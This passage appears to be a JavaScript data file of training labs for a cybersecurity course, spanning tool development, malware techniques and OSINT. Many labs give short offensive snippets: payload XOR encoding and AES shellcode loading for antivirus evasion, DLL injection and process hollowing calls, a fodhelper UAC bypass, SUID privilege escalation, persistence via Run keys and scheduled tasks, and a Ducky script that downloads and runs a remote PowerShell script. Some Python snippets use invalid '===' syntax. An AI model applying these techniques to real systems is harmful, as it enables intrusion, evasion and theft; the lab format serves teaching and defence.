        duration: "2 Hours",
        xp: 50,
        description: "Create a directory brute-forcer script that checks HTTP status codes of target list URLs.",
        guide: {
            objective: "Build a custom crawler that tests paths to locate hidden resources and administration portals.",
            labSetup: "Python and requests library installed; local test web target active.",
            steps: [
                "Create a Python program loading request modules.",
                "Load text wordlists containing directory folders.",
                "Loop through path arrays and send HTTP requests targeting root domains.",
                "Filter and output paths returning active status codes (200, 301, 403)."
            ],
            commands: "Python request test:\nimport requests\nurl = 'http://target.local/admin'\nr = requests.get(url, allow_redirects=False)\nif r.status_code === 200:\n    print('Found directory:', url)",
            mitigation: "Configure target systems to rate limit traffic, restrict IP blocks, and monitor web logs for high-frequency scan queries."
        }
    },
    {
        id: 39,
        title: "Base64 & XOR Payload Encoder",
        category: "tool-dev",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Write an encoder tool in Python that obfuscates payload binaries using XOR logic to bypass basic detection.",
        guide: {
            objective: "Obfuscate scripts and executables using custom byte manipulation structures.",
            labSetup: "Python environment; test payload script.",
            steps: [
                "Define a byte-array mapping target payloads.",
                "Write XOR loop operations that modify values using security keys.",
                "Apply Base64 encoding to outputs to ensure string compatibility.",
                "Create stub scripts that reverse modifications dynamically during runtime execution."
            ],
            commands: "Python XOR operation logic:\ndef xor(data, key):\n    return bytearray([b ^ key for b in data])\n# payload = xor(raw_payload, 0x41)",
            mitigation: "Ensure scanning engines analyze system behaviors and execution paths, rather than relying solely on static signature databases."
        }
    },
    {
        id: 40,
        title: "Subdomain DNS Resolver Script",
        category: "tool-dev",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Develop a Python script that sweeps target domain names to discover active subdomains.",
        guide: {
            objective: "Query target domains to map out host resources.",
            labSetup: "Python environment; dnspython module installed.",
            steps: [
                "Install dnspython packages via pip.",
                "Read subdomain lists from static text dictionaries.",
                "Perform DNS lookup operations (dns.resolver.resolve) for combinations of subdomains.",
                "Output hosts that return valid A-record address assignments."
            ],
            commands: "DNS Query check:\nimport dns.resolver\ntry:\n    ans = dns.resolver.resolve('admin.example.com', 'A')\n    print('Subdomain exists:', ans[0])\nexcept Exception: pass",
            mitigation: "Configure internal systems to limit DNS zone transfers, and disable wildcards on public domains."
        }
    },
    {
        id: 41,
        title: "Scapy Packet Injector",
        category: "tool-dev",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Construct and inject custom TCP network packets using Scapy scripts.",
        guide: {
            objective: "Build and send custom network packet headers to check target responses.",
            labSetup: "Python and scapy installed locally with administrative access permissions.",
            steps: [
                "Write a Python script importing Scapy libraries.",
                "Configure layers mapping IP and TCP parameters (IP(dst=...) / TCP(dport=...)).",
                "Inject custom data variables inside the packet payload layer.",
                "Execute the send function and monitor responses via tcpdump."
            ],
            commands: "Scapy command line setup:\npip install scapy\n\nScapy custom packet injection:\nfrom scapy.all import *\npkt = IP(dst='192.168.1.1')/TCP(dport=80, flags='S')\nsend(pkt)",
            mitigation: "Configure firewalls to block incoming traffic streams that feature malformed packet headers."
        }
    },
    {
        id: 42,
        title: "PDF Metadata Extractor Tool",
        category: "tool-dev",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Develop a Python utility that scans PDF documents to extract metadata like creators, tools, and edit histories.",
        guide: {
            objective: "Extract target OS details and creator profiles from PDF document variables.",
            labSetup: "Python and pypdf package installed; test PDF files.",
            steps: [
                "Install PyPDF libraries in the environment.",
                "Write scripts that load documents (PdfReader).",
                "Access dictionary parameters containing file metadata.",
                "Print output parameters (e.g. Creator, Producer, Author)."
            ],
            commands: "Metadata retrieval script:\nfrom pypdf import PdfReader\nreader = PdfReader('test.pdf')\nmeta = reader.metadata\nprint('Author:', meta.author)\nprint('Creator tool:', meta.creator)",
            mitigation: "Sanitize PDF files before publishing them online to prevent leaking internal usernames or server directories."
        }
    },
    {
        id: 43,
        title: "Password Hash Cracker",
        category: "tool-dev",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Build an offline dictionary hash cracker script that checks wordlist hashes against targets.",
        guide: {
            objective: "Recover plain-text passwords from target hash values.",
            labSetup: "Python environment; standard wordlist text documents.",
            steps: [
                "Import hashlib modules in the script.",
                "Read password wordlists line-by-line.",
                "Calculate hash values of words using MD5 or SHA-256.",
                "Compare generated hashes to the target string to find matches."
            ],
            commands: "Hash crack operation snippet:\nimport hashlib\ntest_hash = hashlib.sha256(b'password').hexdigest()\nif test_hash === target_hash:\n    print('Password found!')",
            mitigation: "Use salted hashing algorithms (bcrypt, Argon2) to make dictionary attacks computationally expensive."
        }
    },
    {
        id: 44,
        title: "HTTP Banner Grabber Tool",
        category: "tool-dev",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Write a tool that checks HTTP response headers to identify server software and versions.",
        guide: {
            objective: "Identify target server software setups by querying system headers.",
            labSetup: "Python environment; local test web target active.",
            steps: [
                "Write a Python script utilizing socket connections.",
                "Connect to target ports and transmit standard HTTP requests (GET / HTTP/1.1).",
                "Receive headers from servers and filter response arrays.",
                "Output specific variables like Server and X-Powered-By."
            ],
            commands: "Raw socket request payload:\ns.sendall(b'GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n')\nresponse = s.recv(1024)\nprint(response.decode())",
            mitigation: "Disable or mask diagnostic header information in target web server configuration files (e.g., expose Server: Apache instead of specific version tags)."
        }
    },
    {
        id: 45,
        title: "Wireless Beacon Frame Flooder",
        category: "tool-dev",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Build a script using Scapy that broadcasts thousands of spoofed Wi-Fi beacons to flood scanning devices.",
        guide: {
            objective: "Flood scanning devices by generating spoofed wireless beacon frames.",
            labSetup: "Kali Linux setup; network card supporting wireless packet injection.",
            steps: [
                "Create Scapy script files utilizing Dot11 and Dot11Beacon objects.",
                "Loop through list directories containing fake network SSID names.",
                "Transmit constructed packets over wireless card interfaces.",
                "Verify mock SSIDs pop up on local mobile phone Wi-Fi lists."
            ],
            commands: "Beacon packet generator:\npkt = RadioTap()/Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2='00:11:22:33:44:55', addr3='00:11:22:33:44:55')/Dot11Beacon(cap='ESS')/Dot11Elt(ID='SSID', info='FakeNetwork')",
            mitigation: "Configure wireless client filters to flag anomalies, and block untrusted networks."
        }
    },
    {
        id: 46,
        title: "Multi-threaded Link Crawler",
        category: "tool-dev",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Create a rapid site crawler that indexes web links using multi-threaded request workers.",
        guide: {
            objective: "Audit web applications to catalog pages and identify potential targets.",
            labSetup: "Python setup; beautifulsoup4 and request modules installed.",
            steps: [
                "Parse HTML bodies to locate anchor links (href).",
                "Add found domains to checking queues, preventing duplicate runs.",
                "Deploy thread pools to query links concurrently.",
                "Dump paths to local output files."
            ],
            commands: "Installation command:\npip install beautifulsoup4\n\nLink extraction code:\nfrom bs4 import BeautifulSoup\nsoup = BeautifulSoup(r.text, 'html.parser')\nfor link in soup.find_all('a'):\n    print(link.get('href'))",
            mitigation: "Implement rate-limiting rules and configure CAPTCHAs to detect high-frequency crawlers."
        }
    },
    {
        id: 47,
        title: "MAC Address Changer Script",
        category: "tool-dev",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Write a command-line script in Python that alters network adapter MAC addresses dynamically.",
        guide: {
            objective: "Write an automation tool that updates MAC parameters on specified network interfaces.",
            labSetup: "Python environment; subprocess modules mapping system execution paths.",
            steps: [
                "Import subprocess modules in Python.",
                "Write functions that invoke system interface tools (ifconfig / ip).",
                "Execute terminal commands disabling interfaces, updating MAC addresses, and restarting connections.",
                "Implement validation checks to confirm adapter variables update successfully."
            ],
            commands: "Subprocess interface call:\nimport subprocess\nsubprocess.call(['ip', 'link', 'set', 'dev', 'eth0', 'down'])\nsubprocess.call(['ip', 'link', 'set', 'dev', 'eth0', 'address', '00:11:22:33:44:55'])",
            mitigation: "Secure code review: always validate interface inputs in code to prevent command injections."
        }
    },
    {
        id: 48,
        title: "Nessus API Vulnerability Scanner",
        category: "tool-dev",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Write a script that interfaces with the Nessus REST API to start scans and download reports.",
        guide: {
            objective: "Automate network security audits using API requests to trigger scanners.",
            labSetup: "Active Nessus vulnerability scanner setup with API keys generated.",
            steps: [
                "Verify API authentication token structures in Nessus admin panels.",
                "Write requests that trigger target scan templates.",
                "Monitor query status checks for scan completions.",
                "Download scan details via JSON responses."
            ],
            commands: "Nessus API POST request:\nheaders = {'X-ApiKeys': 'accessKey=KEY; secretKey=KEY'}\nrequests.post('https://localhost:8834/scans', headers=headers, json=scan_data)",
            mitigation: "Enforce strict IP restrictions and role-based access control on scanner management consoles."
        }
    },
    {
        id: 49,
        title: "Automated SQL Injection Script",
        category: "tool-dev",
        difficulty: "advanced",
        duration: "4 Hours",
        xp: 100,
        description: "Write a script that automates parameter checking on login fields to identify SQL vulnerabilities.",
        guide: {
            objective: "Build an automated testing tool that detects database input validation errors.",
            labSetup: "Python setup; target pages hosting vulnerable database inputs.",
            steps: [
                "Create queries containing testing lists (e.g. single quotes, UNION statements).",
                "Transmit HTTP requests using parameters mapped with the testing lists.",
                "Scan response bodies for SQL database error warnings (e.g., MySQL syntax errors).",
                "Log vulnerable parameters for manual review."
            ],
            commands: "Error check snippet:\nerrors = ['mysql_fetch_array', 'syntax error in SQL', 'PostgreSQL query failed']\nif any(e in r.text for e in errors):\n    print('Vulnerable parameter found!')",
            mitigation: "Use robust input sanitization and enforce parametrized queries across all application database calls."
        }
    },
    {
        id: 50,
        title: "SSH Honeypot Script",
        category: "tool-dev",
        difficulty: "intermediate",
        duration: "3-4 Hours",
        xp: 75,
        description: "Build an SSH honeypot script in Python that logs attempts made by network brute-force bots.",
        guide: {
            objective: "Track network attackers by deploying a simulated SSH service on port 22.",
            labSetup: "Python setup; paramiko library installed; system port 22 mapped to script listener.",
            steps: [
                "Install paramiko libraries to manage SSH parameters.",
                "Deploy socket listeners listening on system ports (e.g. port 22).",
                "Write script callbacks that capture user logins without verifying passwords.",
                "Write attempts, passwords, and source IPs to log text files."
            ],
            commands: "Install Paramiko:\npip install paramiko\n\nSocket bind check:\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.bind(('0.0.0.0', 22))\ns.listen(100)",
            mitigation: "Ensure default SSH services are placed on non-standard ports, and monitor system connections."
        }
    },
    {
        id: 51,
        title: "ICMP Ping Sweep Script",
        category: "tool-dev",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Write a lightweight network discovery script in Bash/Python that pings subnets to find active IPs.",
        guide: {
            objective: "Discover active subnet hosts using ICMP requests.",
            labSetup: "Python/Bash environment; local network space with running devices.",
            steps: [
                "Write network sweeps loops iterating across host ranges (1 to 254).",
                "Format system ping commands sending single request frames (-c 1).",
                "Process output signals checking for returns.",
                "Display IPs that reply to the ping requests."
            ],
            commands: "Bash Sweep script:\nfor ip in {1..254}; do\n  ping -c 1 -W 1 192.168.1.$ip | grep 'bytes from' &\ndone",
            mitigation: "Ensure network scripts validate input boundaries to prevent shell injections."
        }
    },

    // Malware & Defense (52-68)
    {
        id: 52,
        title: "Custom Snort IDS Rule Formulation",
        category: "malware-defense",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Write detection signatures in Snort to alert on suspicious network traffic like Nmap scans or shell connections.",
        guide: {
            objective: "Configure alert signatures to detect malicious traffic on system adapters.",
            labSetup: "Install Snort locally or use predefined sandbox containers mapping interfaces.",
            steps: [
                "Locate Snort config and rule directories (local.rules).",
                "Write a Snort rule that checks for TCP packets targeting specific ports (e.g., port 4444).",
                "Configure rule flags to inspect payload content for malicious strings.",
                "Run Snort on dynamic interfaces to verify alerts trigger when scanning targets."
            ],
            commands: "Snort TCP Scan Detection Rule:\nalert tcp any any -> $HOME_NET 22 (msg:\"SSH Scan Attempt\"; flags:S; sid:1000001; rev:1;)\n\nTest Snort configuration:\nsudo snort -A console -q -c /etc/snort/snort.conf -i eth0",
            mitigation: "Regularly update IDS rule signatures, and monitor networks to investigate alert logs."
        }
    },
    {
        id: 53,
        title: "Registry Run Key Persistence",
        category: "malware-defense",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Demonstrate malware persistence by configuring Windows Registry Run keys to auto-launch executables.",
        guide: {
            objective: "Establish application persistence by modifying registry configurations.",
            labSetup: "A Windows testing system or VM with administrative shell privileges.",
            steps: [
                "Open Windows PowerShell as an Administrator.",
                "Identify standard Windows startup registry keys (e.g., HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run).",
                "Write a registry key mapping to a dummy testing script.",
                "Restart the system and verify the dummy script launches automatically upon user login."
            ],
            commands: "PowerShell registry key creation:\nNew-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'PersistenceTest' -Value 'C:\\Temp\\script.bat' -PropertyType 'String'",
            mitigation: "Restrict access to registry keys. Monitor Run keys for changes using Group Policies or security agents."
        }
    },
    {
        id: 54,
        title: "Buffer Overflow on 32-bit Binary",
        category: "malware-defense",
        difficulty: "advanced",
        duration: "4-5 Hours",
        xp: 100,
        description: "Exploit stack overflows on 32-bit executables using custom inputs to hijack instruction pointers.",
        guide: {
            objective: "Perform local code execution on systems by exploiting memory overflow vulnerabilities.",
            labSetup: "A 32-bit Linux testing system; a target C program compiled with stack protection disabled.",
            steps: [
                "Analyze the target binary program structure to locate buffer vulnerabilities.",
                "Generate custom testing inputs containing padding characters to crash the binary.",
                "Determine instruction pointer offset parameters using pattern calculators.",
                "Construct payload arrays containing shellcode addresses and overwrite EIP targets to execute code."
            ],
            commands: "Disable Linux stack ASLR:\nsudo sysctl -w kernel.randomize_va_space=0\n\nCompile without stack protection:\ngcc -fno-stack-protector -z execstack -m32 vulnerability.c -o vulnerability",
            mitigation: "Enforce compiler protection features (ASLR, DEP, stack canaries), and write memory-safe code."
        }
    },
    {
        id: 55,
        title: "DLL Process Injection Simulation",
        category: "malware-defense",
        difficulty: "advanced",
        duration: "5 Hours",
        xp: 100,
        description: "Simulate process injection attacks by executing APIs to write DLL payloads into target memory.",
        guide: {
            objective: "Inject testing code into active processes using Windows APIs.",
            labSetup: "Windows system environment; C/C++ compiler setup; target process (e.g., notepad.exe) running.",
            steps: [
                "Write C code that opens target processes using OpenProcess.",
                "Allocate virtual memory spaces inside the target processes using VirtualAllocEx.",
                "Write target DLL paths into allocated memory zones using WriteProcessMemory.",
                "Launch remote injection threads using CreateRemoteThread."
            ],
            commands: "C injection sequence calls:\nHANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);\nLPVOID addr = VirtualAllocEx(proc, NULL, pathLen, MEM_COMMIT, PAGE_READWRITE);\nWriteProcessMemory(proc, addr, dllPath, pathLen, NULL);\nCreateRemoteThread(proc, NULL, 0, loadLibraryAddr, addr, 0, NULL);",
            mitigation: "Deploy endpoint detection software (EDR) to monitor API calls. Enforce security configurations like Process Mitigations."
        }
    },
    {
        id: 56,
        title: "Splunk Alert Configuration",
        category: "malware-defense",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Configure Splunk queries to monitor security event logs and alert on failed logins.",
        guide: {
            objective: "Establish automated alert rules in Splunk to flag suspicious account activity.",
            labSetup: "A running Splunk dashboard logging authentication events from system logs.",
            steps: [
                "Write search queries in Splunk (SPL) targeting failed logins.",
                "Apply aggregation rules to identify high-frequency failed login attempts from specific IPs.",
                "Configure automated alert triggers to email administrators when search criteria are met.",
                "Test alert rules by generating multiple failed login attempts on a system."
            ],
            commands: "Splunk failed logins search:\nindex=windows EventCode=4625 | stats count by TargetUserName, SourceNetworkAddress | where count > 5",
            mitigation: "Regularly tune alert thresholds to prevent alert fatigue. Audit authentication mechanisms."
        }
    },
    {
        id: 57,
        title: "Cuckoo Sandbox Malware Check",
        category: "malware-defense",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Analyze untrusted executables inside Cuckoo Sandbox and review dynamic file reports.",
        guide: {
            objective: "Analyze malware samples safely inside isolated environments.",
            labSetup: "Install Cuckoo Sandbox inside virtual environments hosting isolated guest VMs.",
            steps: [
                "Submit test files to the Cuckoo analyzer interface.",
                "Launch the sandbox and monitor network behavior and system modifications.",
                "Review the generated report to identify signature matches and dropped payloads.",
                "Export results and IOCs (Indicators of Compromise) for security planning."
            ],
            commands: "Submit file to cuckoo:\ncuckoo submit --timeout 120 /path/to/malicious.exe",
            mitigation: "Deploy automated sandboxing tools to scan email attachments and public file downloads."
        }
    },
    {
        id: 58,
        title: "Process Hollowing Execution Lab",
        category: "malware-defense",
        difficulty: "expert",
        duration: "6-8 Hours",
        xp: 150,
        description: "Launch legitimate system binaries in suspended states, hollow their code segments, and inject target payloads.",
        guide: {
            objective: "Perform process masquerading by running payloads inside legitimate system processes.",
            labSetup: "Windows system VM; Visual Studio development environment.",
            steps: [
                "Create a legitimate host process in a suspended state using Windows APIs.",
                "Unmap target memory segments inside the process using NtUnmapViewOfSection.",
                "Write custom payload sections into the allocated process memory spaces.",
                "Update entry point registers and resume the process to execute the code."
            ],
            commands: "API sequence calls:\nCreateProcessA(..., CREATE_SUSPENDED, ...);\nNtUnmapViewOfSection(pi.hProcess, baseAddr);\nVirtualAllocEx(pi.hProcess, ...);\nWriteProcessMemory(pi.hProcess, ...);\nResumeThread(pi.hThread);",
            mitigation: "Utilize system integrity checking APIs. Deploy advanced behavior-monitoring EDR agents to flag process creations starting in suspended modes."
        }
    },
    {
        id: 59,
        title: "Custom YARA Rule Formulation",
        category: "malware-defense",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Write detection rules in YARA targeting unique strings and hex byte arrays inside ransomware binaries.",
        guide: {
            objective: "Create signature detection parameters to identify threat groups.",
            labSetup: "Install YARA locally; obtain deactivated test malware files.",
            steps: [
                "Examine target binaries in hex editors to locate signature strings.",
                "Formulate YARA rules mapping defined string patterns.",
                "Write execution conditions stating matching requirements.",
                "Run YARA across document directories to scan for matches."
            ],
            commands: "YARA Rule format:\nrule Ransomware_Alert {\n  strings:\n    $a = \"WannaDecryptor\"\n    $b = { 41 41 41 41 }\n  condition:\n    $a or $b\n}\n\nExecute YARA scan:\nyara rule.yar /path/to/files/",
            mitigation: "Deploy YARA rules in security pipelines to audit mail systems, repositories, and local system paths."
        }
    },
    {
        id: 60,
        title: "USB Rubber Ducky Simulation",
        category: "malware-defense",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Write Ducky Script payloads that emulate human keystrokes to open system terminals and download scripts.",
        guide: {
            objective: "Perform local system updates by simulating keyboard inputs.",
            labSetup: "Ducky script sandbox tool, or a local system executing automated keystroke macros.",
            steps: [
                "Write keystroke scripts using Ducky script commands.",
                "Add system delays to account for hardware initialization.",
                "Write actions that open target terminal consoles and download dummy files.",
                "Execute and test the scripts to verify system modifications."
            ],
            commands: "Ducky Script Example:\nDELAY 1000\nGUI r\nDELAY 200\nSTRING cmd.exe\nENTER\nDELAY 500\nSTRING powershell -c \"iex(New-Object Net.WebClient).DownloadString('http://target/script.ps1')\"\nENTER",
            mitigation: "Block system storage connections. Disable terminal access keys using endpoint group configurations."
        }
    },
    {
        id: 61,
        title: "PrivEsc via Linux SUID Binaries",
        category: "malware-defense",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Locate and exploit misconfigured SUID binaries to elevate privilege levels to root on Linux.",
        guide: {
            objective: "Elevate user permissions by exploiting vulnerabilities in SUID file configurations.",
            labSetup: "A Linux environment containing system tools (e.g. find, vim) misconfigured with SUID flags.",
            steps: [
                "Scan target directories to find files configured with SUID parameters.",
                "Cross-reference found tools with GTFOBins rules to check for privilege escalation options.",
                "Execute the target tool using specific arguments (e.g., find . -exec /bin/sh -p) to bypass shell restrictions.",
                "Verify user privilege levels elevate to root."
            ],
            commands: "Find SUID binaries:\nfind / -perm -u=s -type f 2>/dev/null\n\nExploit SUID find:\nfind . -exec /bin/sh -p \\; -quit",
            mitigation: "Audit SUID file flags. Regularly update file permissions, and restrict SUID configurations to minimal requirements."
        }
    },
    {
        id: 62,
        title: "Windows UAC Bypass Simulation",
        category: "malware-defense",
        difficulty: "advanced",
        duration: "4 Hours",
        xp: 100,
        description: "Bypass User Account Control (UAC) prompts on Windows systems using registry manipulation techniques.",
        guide: {
            objective: "Acquire elevated administrative privileges without triggering user authorization prompts.",
            labSetup: "A Windows target system; a local user account configured with admin capabilities.",
            steps: [
                "Locate legitimate Windows executables (e.g. fodhelper.exe) that auto-elevate privileges.",
                "Identify registry paths monitored by the target program (e.g., HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command).",
                "Update target registry key values mapping to custom payload files.",
                "Run the target helper executable to verify execution of the custom payloads in elevated states."
            ],
            commands: "Registry updates in PowerShell:\nNew-Item -Path 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' -Force\nSet-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' -Name '(Default)' -Value 'C:\\Windows\\System32\\cmd.exe' -Force\nStart-Process 'C:\\Windows\\System32\\fodhelper.exe'",
            mitigation: "Configure UAC settings to 'Always Notify'. Limit administrative user groups to essential personnel."
        }
    },
    {
        id: 63,
        title: "API Hooking for Credential Theft",
        category: "malware-defense",
        difficulty: "expert",
        duration: "6 Hours",
        xp: 150,
        description: "Write a program that intercepts and monitors Windows API calls in memory to steal user credentials.",
        guide: {
            objective: "Intercept and log system calls in memory by implementing custom API hooks.",
            labSetup: "Windows VM; development environment compiled mapping API libraries.",
            steps: [
                "Analyze memory allocations of target APIs to identify entry points.",
                "Inject inline detour variables modifying target function headers.",
                "Redirect execution flows through custom logging functions.",
                "Log credentials from API parameters before resuming original system processes."
            ],
            commands: "C Detour Hook snippet:\n#include <detours.h>\nstatic int (WINAPI * TrueConnect)(...) = targetConnect;\nint WINAPI HookedConnect(...) {\n  // Log data\n  return TrueConnect(...);\n}",
            mitigation: "Ensure software libraries use cryptographic signatures. Deploy endpoint security systems."
        }
    },
    {
        id: 64,
        title: "Memory Forensics using Volatility",
        category: "malware-defense",
        difficulty: "intermediate",
        duration: "3-4 Hours",
        xp: 75,
        description: "Analyze raw system memory dumps using Volatility to extract process listings, network ports, and passwords.",
        guide: {
            objective: "Reconstruct system events by analyzing memory image files.",
            labSetup: "Volatility tool installed locally; raw memory dumps from Windows systems.",
            steps: [
                "Identify OS profiles corresponding to target memory images.",
                "Generate process listings (pslist) to locate suspicious background executions.",
                "Inspect active connections using netscan to find suspicious external IPs.",
                "Dump registry segments and run credential extraction plugins."
            ],
            commands: "Identify memory profiles:\nvol -f memory.raw windows.info\n\nProcess list scan:\nvol -f memory.raw windows.pslist\n\nExtract network ports:\nvol -f memory.raw windows.netscan",
            mitigation: "Deploy endpoint agents to monitor process spaces and secure memory access configurations."
        }
    },
    {
        id: 65,
        title: "Scheduled Task Persistence Setup",
        category: "malware-defense",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Deploy automated persistence hooks on Windows systems by configuring Scheduled Tasks.",
        guide: {
            objective: "Configure scheduled execution points to maintain access on systems.",
            labSetup: "A Windows VM environment with administrative command access.",
            steps: [
                "Open Windows PowerShell as an Administrator.",
                "Write scheduled task structures stating triggers (e.g. daily, user login).",
                "Bind tasks to execution commands mapping to target scripts.",
                "Verify task execution schedules and confirm persistence behavior."
            ],
            commands: "PowerShell task creation:\n$action = New-ScheduledTaskAction -Execute 'C:\\Windows\\System32\\cmd.exe'\n$trigger = New-ScheduledTaskTrigger -AtStartup\nRegister-ScheduledTask -TaskName 'PersistenceTask' -Action $action -Trigger $trigger -User 'SYSTEM'",
            mitigation: "Restrict permissions to scheduled task folders. Monitor system logs for new task registrations."
        }
    },
    {
        id: 66,
        title: "AV Bypass via Payload Encryption",
        category: "malware-defense",
        difficulty: "advanced",
        duration: "4 Hours",
        xp: 100,
        description: "Encrypt shellcode using AES algorithms to bypass antivirus scan signatures, decrypting it dynamically during execution.",
        guide: {
            objective: "Evade static signature detection rules by encrypting binary payloads.",
            labSetup: "A Windows target system running basic AV software; a C/C++ compiler.",
            steps: [
                "Encrypt binary shellcode files using AES keys.",
                "Write C code that allocates executable memory zones (VirtualAlloc).",
                "Decrypt the shellcode block in memory using decryption keys during execution.",
                "Execute the decrypted shellcode using function pointer references."
            ],
            commands: "Virtual memory allocation C logic:\nvoid *exec = VirtualAlloc(0, shellcodeLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\nmemcpy(exec, decryptedShellcode, shellcodeLen);\n((void(*)())exec)();",
            mitigation: "Deploy system-level behavior analysis and monitor memory changes dynamically."
        }
    },
    {
        id: 67,
        title: "Linux Rootkit Kernel Module",
        category: "malware-defense",
        difficulty: "expert",
        duration: "6 Hours",
        xp: 150,
        description: "Write a basic Linux Kernel Module rootkit that intercepts syscall vectors to hide files and processes.",
        guide: {
            objective: "Evade detection on systems by implementing custom kernel modifications.",
            labSetup: "A Linux VM compiled with active kernel headers; root privileges.",
            steps: [
                "Write C code defining kernel modifications.",
                "Intercept system calls (e.g., sys_getdents) to hide files containing target strings.",
                "Compile and load the kernel module (insmod).",
                "Verify files containing the target strings are hidden from listing commands."
            ],
            commands: "Load kernel module:\nsudo insmod rootkit.ko\n\nVerify module listings:\nlsmod | grep rootkit",
            mitigation: "Enable secure boot configurations, restrict kernel loading, and monitor system parameters."
        }
    },
    {
        id: 68,
        title: "Process Masquerading and Name Spoof",
        category: "malware-defense",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Evade detection on Windows systems by running custom payloads that mimic standard system processes like svchost.exe.",
        guide: {
            objective: "Evade analysis on target systems by naming execution files after core processes.",
            labSetup: "Windows system VM; process explorer utilities installed.",
            steps: [
                "Rename custom executable payloads to match core system services (e.g. svchost.exe).",
                "Execute payloads from temp folders using standard system privileges.",
                "Inspect system processes using Process Explorer to verify they blend in.",
                "Analyze process parameters to identify clues like incorrect paths."
            ],
            commands: "Analyze execution paths:\nGet-Process svchost | Select-Object Path",
            mitigation: "Monitor system executions starting from unexpected folders (e.g. Temp directory)."
        }
    },

    // OSINT & Forensics (69-84)
    {
        id: 69,
        title: "EXIF Geolocation Extraction",
        category: "osint-forensics",
        difficulty: "beginner",
        duration: "1-2 Hours",
        xp: 50,
        description: "Extract hidden EXIF metadata from image uploads to discover camera variables, creator details, and GPS coordinates.",
        guide: {
            objective: "Retrieve geolocation details and camera settings from target image files.",
            labSetup: "Python environment; exiftool utility installed locally.",
            steps: [
                "Locate target image files (JPEG/TIFF) containing metadata.",
                "Analyze target files using Exiftool to list metadata parameters.",
                "Locate GPS coordinates (latitude and longitude) in metadata fields.",
                "Map coordinates to search maps to find geolocations."
            ],
            commands: "Install Exiftool:\nsudo apt install exiftool\n\nExtract image metadata:\nexiftool photo.jpg\n\nFilter GPS coordinates:\nexiftool -gps* photo.jpg",
            mitigation: "Sanitize files and remove metadata before sharing images online."
        }
    },
    {
        id: 70,
        title: "Whois and DNS History Map",
        category: "osint-forensics",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Perform passive OSINT scans on target domains to map ownership, registration details, and host history.",
        guide: {
            objective: "Perform passive reconnaissance on domains to map target assets.",
            labSetup: "Public domain search portals; whois tool installed locally.",
            steps: [
                "Query target domains using whois tools to find registrar details.",
                "Search DNS history records to map historical IP changes.",
                "Query subdomains to discover hidden server interfaces.",
                "Document IP ranges for active target scans."
            ],
            commands: "Query whois records:\nwhois target.com\n\nResolve DNS targets:\ndig target.com ANY",
            mitigation: "Use domain privacy protection settings to hide registrant email and contact details from whois databases."
        }
    },
    {
        id: 71,
        title: "Email Header Spoofing Audit",
        category: "osint-forensics",
        difficulty: "intermediate",
        duration: "2-3 Hours",
        xp: 75,
        description: "Analyze email headers to identify spoofed origins, verify routing paths, and inspect security records (SPF, DKIM, DMARC).",
        guide: {
            objective: "Analyze email headers to identify spoofed emails and detect phishing sources.",
            labSetup: "Receive a test email; download raw header files.",
            steps: [
                "Open raw header files in text editors.",
                "Analyze Received lines to map the transmission path.",
                "Verify routing details against SPF records.",
                "Check DKIM signatures and DMARC parameters to confirm authentication status."
            ],
            commands: "Check DNS TXT records:\ndig target.com TXT | grep -E 'spf|dmarc'",
            mitigation: "Configure SPF, DKIM, and DMARC policies on mail systems to prevent unauthorized email spoofing."
        }
    },
    {
        id: 72,
        title: "Username Hunting via Sherlock",
        category: "osint-forensics",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Search username availability across 400+ online platforms using Sherlock to profile target users.",
        guide: {
            objective: "Profile target users by finding active accounts matching usernames across multiple platforms.",
            labSetup: "Python setup; Sherlock tool cloned locally.",
            steps: [
                "Clone the Sherlock repository from GitHub.",
                "Install dependency packages using pip.",
                "Run Sherlock sweeps with target username arguments.",
                "Document matches and analyze pages to gather information."
            ],
            commands: "Clone Sherlock:\ngit clone https://github.com/sherlock-project/sherlock.git\ncd sherlock\npip install -r requirements.txt\n\nSearch usernames:\npython3 sherlock.py [username]",
            mitigation: "Avoid reusing usernames across public platforms."
        }
    },
    {
        id: 73,
        title: "PCAP Malicious User Agent Check",
        category: "osint-forensics",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Audit network PCAP captures using tshark to identify user agent strings linked to malware.",
        guide: {
            objective: "Identify infected hosts in network captures by analyzing HTTP request headers.",
            labSetup: "tshark tool installed; network PCAP capture file containing HTTP traffic.",
            steps: [
                "Open tshark on target PCAP files.",
                "Filter captures to isolate HTTP request headers.",
                "Extract user agent strings from packets.",
